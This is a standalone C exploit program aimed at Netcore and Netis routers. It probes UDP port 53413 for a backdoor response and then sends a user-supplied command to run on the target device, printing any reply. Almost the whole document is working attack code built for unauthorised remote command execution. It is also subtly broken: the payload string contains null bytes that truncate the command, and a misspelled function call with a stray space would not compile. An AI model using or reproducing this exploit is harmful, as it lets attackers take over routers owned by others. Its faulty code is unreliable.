// Netcore Router", Netis Router

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAX_RESPONSE_SIZE 1024
#define UDP_PORT 53413

int create_udp_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }
    return sock;
}

int send_udp_message(int sock, const char *target_ip, int port, const unsigned char *payload, size_t payload_size) {
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    return sendto(sock, payload, payload_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
}

int receive_udp_response(int sock, unsigned char *buffer, size_t buffer_size) {
    struct sockaddr_in server_addr;
    socklen_t addr_len = sizeof(server_addr);
    return recvfrom(sock, buffer, buffer_size, 0, (struct sockaddr *)&server_addr, &addr_len);
}

int check_vulnerability(const char *target_ip) {
    unsigned char payload[8] = {0}; // 8 bytes of zero
    unsigned char response[MAX_RESPONSE_SIZE];
    int sock = create_udp_socket();
    if (sock < 0) return 0;

    send_udp_message(sock, target_ip, UDP_PORT, payload, sizeof(payload));
    int bytes_received = receive_udp_response(sock, response, sizeof(response));
    close(sock);

    if (bytes_received > 0) {
        if (bytes_received >= 8 && 
            (response[bytes_received - 8] == 0xD0 && response[bytes_received - 7] == 0xA5 && 
             response[bytes_received - 6] == 'L' && response[bytes_received - 5] == 'o' && 
             response[bytes_received - 4] == 'g' && response[bytes_received - 3] == 'i' && 
             response[bytes_received - 2] == 'n' && response[bytes_received - 1] == ':')) {
            return 1; // Target is vulnerable
        } else if (bytes_received >= 12 && 
                   response[bytes_received - 12] == 0x00 && response[bytes_received - 11] == 0x00 && 
                   response[bytes_received - 10] == 0x00 && response[bytes_received - 9] == 0x05 && 
                   response[bytes_received - 8] == 0x00 && response[bytes_received - 7] == 0x01 && 
                   response[bytes_received - 6] == 0x00 && response[bytes_received - 5] == 0x00 && 
                   response[bytes_received - 4] == 0x00 && response[bytes_received - 3] == 0x01 && 
                   response[bytes_received - 2] == 0x00 && response[bytes_received - 1] == 0x00) {
            return 1; // Target is vulnerable
        }
    }

    return 0; // Target is not vulnerable
}

void execute_command(const char *target_ip, const char *cmd) {
    unsigned char payload[1024];
    unsigned char response[MAX_RESPONSE_SIZE];
    int sock = create_udp_socket();
    if (sock < 0) return;

    // Prepare the payload
    snprintf((char *)payload, sizeof(payload), "AA\x00\x00AAAA%s\x00", cmd);
    send_udp_message(sock, target_ip, UDP_PORT, payload, strlen((char *)payload) + 1);

    // Receive response (optional, could be ignored if blind)
    int bytes_received = receive_udp_response(sock, response, sizeof(response));
    close(sock);

    if (bytes_received > 0) {
        printf("Response: %s\n", response + 8); // Skip the first 8 bytes for the actual response
    }
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <target_ip> <command>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    const char *cmd = argv[2];

    check_v ulnerability(target_ip);
    execute_command(target_ip, cmd);

    return 0;
}
